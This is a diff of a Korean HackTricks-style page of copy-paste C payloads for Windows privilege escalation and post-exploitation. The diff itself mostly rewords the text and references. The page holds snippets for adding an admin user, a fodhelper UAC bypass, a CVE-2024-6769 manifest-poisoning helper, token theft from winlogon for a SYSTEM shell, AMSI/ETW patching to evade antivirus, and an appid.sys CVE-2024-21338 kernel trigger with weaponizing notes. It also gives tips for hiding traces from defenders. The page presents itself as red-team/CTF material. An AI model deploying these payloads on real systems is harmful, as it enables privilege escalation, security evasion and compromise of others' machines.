@@ -2,13 +2,13 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-이 페이지는 Windows Local Privilege Escalation 또는 post-exploitation 상황에서 유용한 **작고 독립적인 C 스니펫들**을 모아둡니다. 각 payload는 **복사-붙여넣기 친화적**으로 설계되었으며 Windows API / C runtime만 필요하고 `i686-w64-mingw32-gcc` (x86) 또는 `x86_64-w64-mingw32-gcc` (x64)로 컴파일할 수 있습니다.
+이 페이지에는 Windows Local Privilege Escalation 또는 post-exploitation 중 유용하게 사용할 수 있는 **작고 독립적인 C snippets**를 모아 두었습니다. 각 payload는 **copy-paste에 적합하도록** 설계되었으며 Windows API / C runtime만 필요하고 `i686-w64-mingw32-gcc` (x86) 또는 `x86_64-w64-mingw32-gcc` (x64)로 컴파일할 수 있습니다.
 
-> ⚠️  이 payload들은 해당 작업을 수행하는 데 필요한 최소 권한(예: `SeDebugPrivilege`, `SeImpersonatePrivilege`, 또는 UAC bypass를 위한 medium-integrity 컨텍스트)을 이미 프로세스가 가지고 있다고 가정합니다. 이들은 취약점 악용으로 arbitrary native code execution이 확보된 **red-team 또는 CTF 환경**을 위한 것입니다.
+> ⚠️  이러한 payload를 사용하려면 작업 수행에 필요한 최소 권한이 프로세스에 이미 있어야 합니다(예: `SeDebugPrivilege`, `SeImpersonatePrivilege` 또는 UAC bypass를 위한 medium-integrity context). 이 payload들은 취약점 exploit을 통해 임의의 native code execution을 확보한 **red-team 또는 CTF 환경**을 대상으로 합니다.
 
 ---
 
-## 로컬 관리자 사용자 추가
+## 로컬 administrator user 추가
 ```c
 // i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
 #include <stdlib.h>
@@ -21,13 +21,13 @@ return 0;
 ---
 
 ## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
-신뢰된 바이너리 **`fodhelper.exe`**가 실행되면, 아래 레지스트리 경로를 쿼리하며 **`DelegateExecute` 동사를 필터링하지 않습니다.**  해당 키 아래에 명령을 심어두면 공격자는 *파일을 디스크에 기록하지 않고*도 UAC를 우회할 수 있습니다.
+신뢰할 수 있는 바이너리 **`fodhelper.exe`**가 실행되면 아래 레지스트리 경로를 조회하며, **`DelegateExecute`** verb를 필터링하지 않습니다. 해당 키 아래에 명령을 심으면 공격자는 디스크에 파일을 저장하지 않고도 UAC를 우회할 수 있습니다.<sup>[[1]](#references)</sup>
 
-*`fodhelper.exe`가 쿼리하는 레지스트리 경로*
+*`fodhelper.exe`가 조회하는 레지스트리 경로*
 ```
 HKCU\Software\Classes\ms-settings\Shell\Open\command
 ```
-권한 상승된 `cmd.exe`를 띄우는 최소 PoC:
+상승된 `cmd.exe`를 실행하는 최소한의 PoC:
 ```c
 // x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
 #define _CRT_SECURE_NO_WARNINGS
@@ -61,21 +61,21 @@ system("fodhelper.exe");
 return 0;
 }
 ```
-*Windows 10 22H2 및 Windows 11 23H2(2025년 7월 패치)에서 테스트했습니다. 우회가 여전히 작동하는 이유는 Microsoft가 `DelegateExecute` 경로의 무결성 검사 누락을 수정하지 않았기 때문입니다.*
+*Windows 10 22H2 및 Windows 11 23H2(2025년 7월 패치)에서 테스트됨. Microsoft가 `DelegateExecute` 경로의 누락된 integrity check를 수정하지 않았기 때문에 이 우회는 여전히 작동합니다.*
 
 ---
 
 ## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
-Drive remapping + activation context cache poisoning은 `ctfmon.exe`가 높은 무결성의 신뢰된 UI 프로세스로 실행되어 호출자의 가장된 `C:` 드라이브에서 기꺼이 로드하고 `CSRSS`가 캐시한 DLL 리디렉션을 재사용하기 때문에 패치된 Windows 10/11 빌드에서도 여전히 효과가 있습니다. 악용 흐름은 다음과 같습니다: `C:`를 공격자 제어 스토리지로 재지정하고 트로이화된 `msctf.dll`을 배치한 뒤 `ctfmon.exe`를 실행해 높은 무결성을 얻고, `CSRSS`에 auto-elevated 바이너리(예: `fodhelper.exe`)에서 사용하는 DLL을 리디렉션하도록 매니페스트를 캐싱하게 요청하면 다음 실행 시 UAC 프롬프트 없이 페이로드가 상속됩니다.
+Drive remapping + activation context cache poisoning은 패치된 Windows 10/11 빌드에서도 여전히 작동합니다. `ctfmon.exe`는 caller의 impersonated `C:` drive에서 기꺼이 로드하고 `CSRSS`가 캐시한 모든 DLL redirection을 재사용하는 high-integrity trusted UI process로 실행되기 때문입니다. 공격 과정은 다음과 같습니다. `C:`를 attacker-controlled storage로 다시 지정하고, trojanized `msctf.dll`을 배치한 다음, `ctfmon.exe`를 실행해 high integrity를 획득합니다. 그런 다음 `CSRSS`에 auto-elevated binary(예: `fodhelper.exe`)가 사용하는 DLL을 redirect하는 manifest를 캐시하도록 요청하면, 다음 실행 시 UAC prompt 없이 payload를 상속받습니다.<sup>[[5]](#references)</sup>
 
-실제 워크플로:
-1. 가짜 %SystemRoot%\System32 트리를 준비하고 탈취하려는 정품 바이너리(대개 `ctfmon.exe`)를 복사합니다.
-2. `DefineDosDevice(DDD_RAW_TARGET_PATH)`를 사용해 프로세스 내에서 `C:`를 재매핑하고, 변경이 로컬에만 적용되도록 `DDD_NO_BROADCAST_SYSTEM`을 유지합니다.
-3. 가짜 트리에 DLL과 매니페스트를 배치하고 `CreateActCtx/ActivateActCtx`를 호출해 매니페스트를 activation-context 캐시에 푸시한 다음, auto-elevated 바이너리를 실행하여 리디렉션된 DLL이 바로 당신의 쉘코드로 로드되게 합니다.
-4. 작업이 끝나면 캐시 항목(`sxstrace ClearCache`)을 삭제하거나 재부팅하여 공격자 흔적을 지웁니다.
+실제 workflow:
+1. 가짜 `%SystemRoot%\System32` tree를 준비하고 hijack하려는 legitimate binary(대개 `ctfmon.exe`)를 복사합니다.
+2. `DefineDosDevice(DDD_RAW_TARGET_PATH)`를 사용해 process 내부에서 `C:`를 remap하고, 변경 사항이 local 상태로 유지되도록 `DDD_NO_BROADCAST_SYSTEM`을 사용합니다.
+3. 가짜 tree에 DLL과 manifest를 배치하고, `CreateActCtx/ActivateActCtx`를 호출해 manifest를 activation-context cache에 push한 다음, auto-elevated binary를 실행하여 redirected DLL이 shellcode로 바로 resolve되도록 합니다.
+4. 작업이 끝나면 cache entry(`sxstrace ClearCache`)를 삭제하거나 reboot하여 attacker fingerprint를 제거합니다.
 
 <details>
-<summary>C - 가짜 드라이브 + 매니페스트 오염 도우미 (CVE-2024-6769)</summary>
+<summary>C - Fake drive + manifest poison helper (CVE-2024-6769)</summary>
 ```c
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
@@ -127,12 +127,12 @@ return 0;
 ```
 </details>
 
-정리 팁: SYSTEM 권한을 얻은 후 테스트할 때 `sxstrace Trace -logfile %TEMP%\sxstrace.etl`를 호출하고 이어서 `sxstrace Parse`를 실행하세요 — 로그에서 매니페스트 이름이 보이면 방어자도 볼 수 있으므로, 매번 경로를 교체하세요.
+정리 팁: SYSTEM을 획득한 후 테스트할 때 `sxstrace Trace -logfile %TEMP%\sxstrace.etl`을 실행한 다음 `sxstrace Parse`를 호출하세요. 로그에서 manifest name이 보인다면 defenders도 확인할 수 있으므로, 실행할 때마다 경로를 변경하세요.
 
 ---
 
-## 토큰 복제를 통해 SYSTEM 셸 생성 (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
-현재 프로세스가 **둘 다** `SeDebug` 및 `SeImpersonate` 권한을 보유하고 있다면(많은 서비스 계정에서 흔함), `winlogon.exe`에서 토큰을 훔쳐 복제한 뒤 권한 상승된 프로세스를 시작할 수 있습니다:
+## token duplication을 통한 SYSTEM shell 생성 (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
+현재 프로세스가 **SeDebug** 및 **SeImpersonate** 권한을 **모두** 보유하고 있다면(많은 service account에서 일반적임), `winlogon.exe`에서 token을 훔쳐 이를 duplicate한 다음 elevated process를 시작할 수 있습니다:
 ```c
 // x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
 #include <windows.h>
@@ -189,7 +189,7 @@ sedebug-+-seimpersonate-copy-token.md
 ---
 
 ## In-Memory AMSI & ETW Patch (Defence Evasion)
-대부분의 최신 AV/EDR 엔진은 악성 동작을 검사하기 위해 **AMSI** 및 **ETW**에 의존합니다. 현재 프로세스 내부에서 두 인터페이스를 조기에 패치하면 스크립트 기반 payloads(예: PowerShell, JScript)가 스캔되는 것을 방지할 수 있습니다.
+대부분의 최신 AV/EDR 엔진은 악성 동작을 검사하기 위해 **AMSI**와 **ETW**에 의존합니다. 현재 프로세스 내부에서 두 인터페이스를 조기에 패치하면 script 기반 payload(예: PowerShell, JScript)가 스캔되는 것을 방지할 수 있습니다.<sup>[[2]](#references)</sup>
 ```c
 // gcc -o patch_amsi.exe patch_amsi.c -lntdll
 #define _CRT_SECURE_NO_WARNINGS
@@ -216,12 +216,12 @@ MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
 return 0;
 }
 ```
-*위의 패치는 프로세스 로컬입니다; 이를 실행한 후 새로운 PowerShell을 생성하면 AMSI/ETW 검사를 거치지 않고 실행됩니다.*
+*위 patch는 process-local이며, 이를 실행한 후 새 PowerShell을 생성하면 AMSI/ETW inspection 없이 실행됩니다.*
 
 ---
 
-## 자식 프로세스를 Protected Process Light (PPL)로 생성
-생성 시점에 자식에 대해 PPL 보호 수준을 `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`를 사용해 요청합니다. 이는 문서화된 API이며, 대상 이미지가 요청된 서명자 클래스(Windows/WindowsLight/Antimalware/LSA/WinTcb)에 대해 서명되어 있어야만 성공합니다.
+## Protected Process Light (PPL)로 child 생성
+`STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`을 사용하여 생성 시점에 child에 PPL protection level을 요청합니다. 이는 documented API이며, target image가 요청된 signer class(Windows/WindowsLight/Antimalware/LSA/WinTcb)에 맞게 서명된 경우에만 성공합니다.<sup>[[3]](#references)[[4]](#references)</sup>
 ```c
 // x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
 #include <windows.h>
@@ -253,25 +253,25 @@ CloseHandle(pi.hProcess);
 return 0;
 }
 ```
-가장 일반적으로 사용되는 레벨:
+가장 일반적으로 사용되는 Levels:
 - `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
 - `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
 - `PROTECTION_LEVEL_LSA_LIGHT` (4)
 
-Process Explorer/Process Hacker에서 Protection 열을 확인하여 결과를 검증하세요.
+Protection 열을 확인하여 Process Explorer/Process Hacker로 결과를 검증합니다.
 
 ---
 
-## Local Service -> Kernel via `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
-`appid.sys`는 디바이스 객체(`\\.\\AppID`)를 노출하며, 해당 smart-hash 유지보수 IOCTL은 호출자가 `LOCAL SERVICE`로 실행될 때 사용자 제공 함수 포인터를 허용합니다; Lazarus는 이를 악용해 PPL을 비활성화하고 임의 드라이버를 로드합니다. 따라서 red team은 랩 환경에서 사용할 준비된 트리거를 갖추어야 합니다.
+## `appid.sys` Smart-Hash를 통한 Local Service -> Kernel (`IOCTL 0x22A018`, CVE-2024-21338)
+`appid.sys`는 `LOCAL SERVICE`로 실행 중인 호출자가 사용자 제공 function pointer를 전달할 수 있는 smart-hash maintenance IOCTL을 지원하는 device object (`\\.\\AppID`)를 노출합니다. Lazarus는 이를 악용하여 PPL을 비활성화하고 임의의 driver를 로드하고 있으므로, red teams는 lab 사용을 위한 사전 제작 trigger를 준비해야 합니다.<sup>[[6]](#references)</sup>
 
-운영 노트:
-- 여전히 `LOCAL SERVICE` 토큰이 필요합니다. `SeImpersonatePrivilege`를 사용해 `Schedule`이나 `WdiServiceHost`에서 토큰을 훔친 뒤, 장치에 접근하기 전에 권한 대리(impersonate)하여 ACL 검사가 통과되게 하세요.
-- IOCTL `0x22A018`는 두 개의 콜백 포인터(길이 조회 + 읽기 함수)를 포함하는 구조체를 기대합니다. 둘 다 토큰 덮어쓰기나 ring-0 primitives를 매핑하는 user-mode 스텁을 가리키게 하되, 버퍼는 RWX로 유지하여 KernelPatchGuard가 체인 중간에 크래시되지 않도록 하세요.
-- 성공 후에는 권한 대리를 종료하고 디바이스 핸들을 복원하세요; 방어자는 예상치 못한 `Device\\AppID` 핸들을 찾기 때문에 권한을 획득한 즉시 닫아야 합니다.
+운영 참고 사항:
+- 여전히 `LOCAL SERVICE` token이 필요합니다. `SeImpersonatePrivilege`를 사용하여 `Schedule` 또는 `WdiServiceHost`에서 이를 탈취한 다음, ACL 검사를 통과할 수 있도록 device에 접근하기 전에 impersonate합니다.
+- IOCTL `0x22A018`은 두 개의 callback pointer(query length + read function)가 포함된 struct를 요구합니다. 두 pointer를 token overwrite를 구성하거나 ring-0 primitive을 매핑하는 user-mode stub으로 지정하되, KernelPatchGuard가 chain 중간에 crash하지 않도록 buffer를 RWX 상태로 유지합니다.
+- 성공한 후 impersonation을 종료하고 device handle을 revert합니다. 이제 defenders는 예상치 못한 `Device\\AppID` handle을 탐지하므로, privilege를 획득하는 즉시 이를 닫습니다.
 
 <details>
-<summary>C - `appid.sys` smart-hash abuse를 위한 스켈레톤 트리거</summary>
+<summary>C - `appid.sys` smart-hash 악용을 위한 Skeleton trigger</summary>
 ```c
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
@@ -310,16 +310,17 @@ return 0;
 ```
 </details>
 
-무기화된 빌드의 최소 수정: `VirtualAlloc`으로 RWX 섹션을 매핑하고, 거기에 token duplication stub을 복사한 다음 `KernelThunk = section`으로 설정하세요. `DeviceIoControl`이 반환되면 PPL 하에서도 SYSTEM이 되어야 합니다.
+무기화된 빌드를 위한 최소 수정: `VirtualAlloc`으로 RWX section을 매핑하고, token duplication stub을 해당 위치에 복사한 다음, `KernelThunk = section`으로 설정하면 `DeviceIoControl`이 반환된 후 PPL 환경에서도 SYSTEM 권한을 획득하게 됩니다.
 
 ---
 
-## 참조
-* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
-* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
-* CreateProcessAsPPL – 최소 PPL 프로세스 런처: https://github.com/2x7EQ13/CreateProcessAsPPL
-* Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute
-* DarkReading – ["Novel Exploit Chain Enables Windows UAC Bypass"](https://www.darkreading.com/vulnerabilities-threats/windows-activation-context-cache-elevation) (2024)
-* Avast Threat Labs – ["Lazarus Deploys New FudModule Rootkit"](https://decoded.avast.io/threatresearch/lazarus-deploys-new-fudmodule-rootkit/) (2024)
+## References
+
+- [1] Ron Bowes – "Fodhelper UAC Bypass Deep Dive" (2024)
+- [2] SplinterCode – "AMSI Bypass 2023: The Smallest Patch Is Still Enough" (BlackHat Asia 2023)
+- [3] [CreateProcessAsPPL – minimal PPL process launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
+- [4] [UpdateProcThreadAttribute function (Win32 apps) - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute)
+- [5] [Novel Exploit Chain Enables Windows UAC Bypass](https://www.darkreading.com/vulnerabilities-threats/exploit-chain-windows-uac-bypass)
+- [6] [Lazarus and the FudModule Rootkit: Beyond BYOVD with an Admin-to-Kernel Zero-Day](https://www.gendigital.com/blog/insights/research/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day)
 
 {{#include ../../banners/hacktricks-training.md}}
